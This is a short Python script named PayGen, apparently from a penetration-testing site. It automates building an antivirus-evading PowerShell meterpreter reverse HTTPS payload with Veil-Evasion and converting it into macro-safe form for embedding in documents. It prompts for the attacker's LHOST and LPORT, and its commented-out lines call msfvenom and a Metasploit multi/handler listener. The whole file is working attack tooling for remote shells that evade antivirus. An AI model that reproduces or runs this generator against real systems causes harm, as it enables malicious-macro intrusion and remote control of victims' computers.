# PayGen (www.hackwhackandsmack.com)
#
# Written by Ben Turner 2014
#

import io, time, commands, os, subprocess

try:
	inteth = 'eth0'
	inteth_ip = commands.getoutput("ip address show dev " + inteth).split()
	inteth_ip = inteth_ip[inteth_ip.index('inet') + 1].split('/')[0]

except:
	inteth_ip = '127.0.0.1'

ipportdef = '443'
ipaddr = raw_input("\033[0;31mPlease enter LHOST IP Address [" + inteth_ip + "]: \033[0m") or inteth_ip
ipport = raw_input("\033[0;31mPlease enter LPORT [" + ipportdef + "]: \033[0m") or ipportdef

#with open(outputloc + outputname, "w") as outfile:
#	subprocess.call('msfvenom -f ' + payloadformat + ' -p ' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport, shell=True, stdout=outfile)
#time.sleep(2)
#subprocess.call('msfcli multi/handler PAYLOAD=' + payload + ' LHOST=' + ipaddr + ' LPORT=' + lport + ' E', shell=True)

subprocess.call('python /root/Desktop/pentest/av_bypass/Veil-Evasion/Veil-Evasion.py -p powershell/meterpreter/rev_https -c LHOST=' + ipaddr + ' LPORT=' + ipport + ' -o payload --overwrite', shell=True)
subprocess.call('python /root/Desktop/pentest/powershell-payload/macro_safe.py /root/veil-output/source/payload.bat /root/Desktop/powershell.txt', shell=True)


